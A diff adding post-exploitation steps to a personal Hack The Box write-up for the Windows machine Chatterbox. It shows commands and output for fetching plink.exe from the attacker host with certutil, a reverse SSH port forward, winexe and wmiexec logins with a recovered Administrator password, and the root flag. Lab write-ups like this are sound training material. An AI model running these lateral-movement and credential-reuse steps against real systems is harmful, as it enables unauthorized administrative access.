@@ -4,7 +4,7 @@ title: Chatterbox HTB Write-Up
 machine_ip: 10.10.10.74
 os: Windows
 difficulty: Medium
-my_rating: 3
+my_rating: 2
 tags:
   - Windows
   - PrivEsc
@@ -17,6 +17,11 @@ tags:
   - BufferOverflow
   - MSFvenom
   - plink
+  - nmap
+  - netstat
+  - wmiexec
+  - winexec
+  - PortForwarding
 references: "[[📦HTB Writeups]]"
 ---
 
@@ -723,9 +728,240 @@ Server Role:    ROLE_DOMAIN_PDC
 Unknown 3:      0x1
 ```
 
-- `plink.exe` - likely the next step for #PrivEsc
-- ==resume here==
+- `netstat` shows listening ports - shows internal ports not in external scan with `nmap`
+```
+C:\Windows\system32>netstat -ano
+netstat -ano
 
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       664
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       356
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       716
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       904
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       456
+  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       2040
+  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       464
+  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
+  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       3572
+  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       3572
+  TCP    10.10.10.74:49158      10.10.14.4:4444        ESTABLISHED     3572
+  TCP    [::]:135               [::]:0                 LISTENING       664
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       356
+  TCP    [::]:49153             [::]:0                 LISTENING       716
+  TCP    [::]:49154             [::]:0                 LISTENING       904
+  TCP    [::]:49155             [::]:0                 LISTENING       456
+  TCP    [::]:49156             [::]:0                 LISTENING       2040
+  TCP    [::]:49157             [::]:0                 LISTENING       464
+  UDP    0.0.0.0:123            *:*                                    860
+  UDP    0.0.0.0:500            *:*                                    904
+  UDP    0.0.0.0:4500           *:*                                    904
+  UDP    0.0.0.0:5355           *:*                                    1156
+  UDP    0.0.0.0:63220          *:*                                    1156
+  UDP    10.10.10.74:137        *:*                                    4
+  UDP    10.10.10.74:138        *:*                                    4
+  UDP    10.10.10.74:1900       *:*                                    3040
+  UDP    10.10.10.74:9256       *:*                                    3572
+  UDP    10.10.10.74:63458      *:*                                    3040
+  UDP    127.0.0.1:1900         *:*                                    3040
+  UDP    127.0.0.1:63459        *:*                                    3040
+  UDP    [::]:123               *:*                                    860
+  UDP    [::]:500               *:*                                    904
+  UDP    [::]:4500              *:*                                    904
+  UDP    [::1]:1900             *:*                                    3040
+  UDP    [::1]:63457            *:*                                    3040
+```
+
+- With creds found (`Alfred:Welcome1!`) we can use port forwarding to the listening port `445`
+	- `plink.exe` - likely the next step for #PrivEsc (tool for port forwarding ssh/putty)
+	-  [Download here](https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe)
+- Transfer plink to RHOST
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# ll
+total 11224
+-rwxr-xr-x 1 root root    5473 Oct  2 08:11 achat.py
+-rw-r--r-- 1 root root  784384 Oct  1 15:05 Chimichurri.exe
+-rw-r--r-- 1 root root  845104 Oct  2 09:16 plink.exe
+-rw-r--r-- 1 root root 9849344 Oct  1 13:09 winPEASx64.exe
+                                                                                                                                                            
+┌──(root㉿kali)-[~/Downloads]
+└─# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+- Grab file from LHOST
+```
+C:\Users\Alfred>certutil -urlcache -f http://10.10.14.4:8000/plink.exe plink.exe                                 
+certutil -urlcache -f http://10.10.14.4:8000/plink.exe plink.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Alfred>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 502F-F304
+
+ Directory of C:\Users\Alfred
+
+10/02/2024  05:19 PM    <DIR>          .
+10/02/2024  05:19 PM    <DIR>          ..
+12/10/2017  01:05 PM    <DIR>          Contacts
+12/10/2017  07:50 PM    <DIR>          Desktop
+12/10/2017  01:05 PM    <DIR>          Documents
+12/10/2017  01:25 PM    <DIR>          Downloads
+12/10/2017  01:05 PM    <DIR>          Favorites
+12/10/2017  01:05 PM    <DIR>          Links
+12/10/2017  01:05 PM    <DIR>          Music
+12/10/2017  01:05 PM    <DIR>          Pictures
+10/02/2024  05:19 PM           845,104 plink.exe
+12/10/2017  01:05 PM    <DIR>          Saved Games
+12/10/2017  01:05 PM    <DIR>          Searches
+12/10/2017  01:05 PM    <DIR>          Videos
+               1 File(s)        845,104 bytes
+              13 Dir(s)   3,345,833,984 bytes free
+```
+
+- Install `ssh` and edit config to permit root login
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# apt install ssh
+
+┌──(root㉿kali)-[~/Downloads]
+└─# gedit /etc/ssh/sshd_config  
+```
+
+- Modify this line:
+```
+#PermitRootLogin prohibit-password
+```
+- To this:
+```
+PermitRootLogin yes
+```
+- Also, must change `ssh` port from 22 to something else, HTB blocks outbound `ssh` connections... Changed this line
+```
+#Port 22
+```
+- To this:
+```
+Port <PORT NUMBER>
+```
+
+- Save file and do `service ssh restart`
+- Check it is enabled with `service ssh start` and `service ssh status`
+- Run `plink.exe` from RHOST, specifying new `ssh` port to use
+```
+C:\Users\Alfred>plink.exe -v root@10.10.14.4 -R 445:127.0.0.1:445 -P 2222
+plink.exe -v root@10.10.14.4 -R 445:127.0.0.1:445 -P 2222
+Looking up host "10.10.14.4" for SSH connection
+Connecting to 10.10.14.4 port 2222
+Connected to 10.10.14.4
+Remote version: SSH-2.0-OpenSSH_9.9p1 Debian-1
+Using SSH protocol version 2
+If you trust this host, enter "y" to add the key to Plink's
+cache and carry on connecting.
+If you want to carry on connecting just once, without adding
+the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n, Return cancels connection, i for more info) y
+Using username "root".
+root@10.10.14.4's password: *****************
+
+Sent password
+Access granted
+
+Started a shell/command
+Linux kali 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
+
+
+
+
+
+root@kali:-#
+```
+- Was told I may need to hit `ENTER` a few times for `root@kali:-#` to show
+- I was unsuccessful getting the`root@kali:-#` to show, also tried this with same failed result:
+```
+plink.exe -l root -pw ************ -R 445:127.0.0.1:445 10.10.14.4 -P 2222
+```
+
+- However, if you were successful here are the next steps:
+```
+winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
+``` 
+
+- Hit enter/rerun command until you get a shell
+- Should be logged in as `chatterbox\administrator` and check `whoami /priv`
+
+---
+
+- After being unable to get `plink.exe` to show the `root@kali:-#`, I was successful in escalating privileges by using `wmiexec` with the creds `Administrator:Welcome1!`
+	- _Note: I know I should figure out why plink is not working, but with the community sharing their thoughts on this box, it seemed a better use of time to move onto another attack path. Besides I got `plink` to show `Started a shell/command`, the shell just never started_
+
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# wmiexec.py Administrator:'Welcome1!'@10.10.10.74                      
+/usr/local/bin/wmiexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20240916.171021.65b774de', 'wmiexec.py')
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 502F-F304
+
+ Directory of C:\
+
+06/10/2009  05:42 PM                24 autoexec.bat
+06/10/2009  05:42 PM                10 config.sys
+07/13/2009  10:37 PM    <DIR>          PerfLogs
+03/07/2022  12:31 AM    <DIR>          Program Files
+12/10/2017  10:21 AM    <DIR>          Users
+10/02/2024  05:54 PM    <DIR>          Windows
+               2 File(s)             34 bytes
+               4 Dir(s)   3,666,173,952 bytes free
+
+C:\>whoami
+chatterbox\administrator
+
+C:\Users\Administrator\Desktop>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State  
+=============================== ========================================= =======
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
+SeSecurityPrivilege             Manage auditing and security log          Enabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
+SeLoadDriverPrivilege           Load and unload device drivers            Enabled
+SeSystemProfilePrivilege        Profile system performance                Enabled
+SeSystemtimePrivilege           Change the system time                    Enabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled
+SeBackupPrivilege               Back up files and directories             Enabled
+SeRestorePrivilege              Restore files and directories             Enabled
+SeShutdownPrivilege             Shut down the system                      Enabled
+SeDebugPrivilege                Debug programs                            Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
+SeUndockPrivilege               Remove computer from docking station      Enabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
+SeTimeZonePrivilege             Change the time zone                      Enabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
+```
 
 - User flag - Alfred
 ```
@@ -736,5 +972,6 @@ be6b9ea2f3d89bb04f3c562fd3d29458
 
 - Root flag
 ```
-
+C:\Users\Administrator\Desktop>type root.txt
+af99967bf40e56d566799bba2611fc29
 ```
